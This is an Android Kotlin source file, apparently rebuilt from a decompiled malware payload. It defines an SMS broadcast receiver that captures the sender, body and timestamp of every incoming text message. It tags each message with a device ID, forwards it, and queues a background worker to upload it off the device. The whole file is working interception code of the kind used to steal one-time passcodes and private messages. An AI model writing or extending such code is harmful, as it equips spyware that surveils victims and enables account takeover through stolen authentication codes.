package com.payload.jansiix0ne.broadcast

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.telephony.SmsMessage
import android.util.Log
import androidx.work.Data
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import com.payload.jansiix0ne.data.model.SmsModel
import com.payload.jansiix0ne.util.SmsForwarder
import com.payload.jansiix0ne.util.SmsHelper
import com.payload.jansiix0ne.worker.SmsUploadWorker
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.util.Date

/**
 * BroadcastReceiver for receiving SMS messages
 */
class SmsReceiver : BroadcastReceiver() {

    private val receiverScope = CoroutineScope(SupervisorJob() + Dispatchers.Default)

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val pendingResult = goAsync()
            
            receiverScope.launch {
                try {
                    processSms(context, intent)
                } catch (e: Exception) {
                    Log.e(TAG, "Error processing SMS: ${e.message}", e)
                } finally {
                    pendingResult.finish()
                }
            }
        }
    }

    private suspend fun processSms(context: Context, intent: Intent) {
        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        
        if (messages.isNullOrEmpty()) {
            return
        }
        
        val deviceId = SmsHelper.getDeviceId(context)
        val smsForwarder = SmsForwarder(context)
        
        for (smsMessage in messages) {
            val from = smsMessage.originatingAddress ?: ""
            val messageBody = smsMessage.messageBody ?: ""
            val timestamp = smsMessage.timestampMillis
            
            Log.d(TAG, "Received SMS from: $from")
            
            // Create SmsModel for forwarding
            val sms = SmsModel(
                from = from,
                message = messageBody,
                date = Date(timestamp),
                ownerDeviceId = deviceId
            )
            
            // Forward SMS if forwarding is enabled (Based on decompiled code: AbstractC3186z.java)
            smsForwarder.forwardSmsIfEnabled(sms)
            
            // Queue SMS upload worker
            val inputData = Data.Builder()
                .putString("from", from)
                .putString("message", messageBody)
                .putLong("time", timestamp)
                .build()
            
            val uploadWork = OneTimeWorkRequestBuilder<SmsUploadWorker>()
                .setInputData(inputData)
                .build()
            
            WorkManager.getInstance(context).enqueue(uploadWork)
        }
    }

    companion object {
        private const val TAG = "SmsReceiver"
    }
}
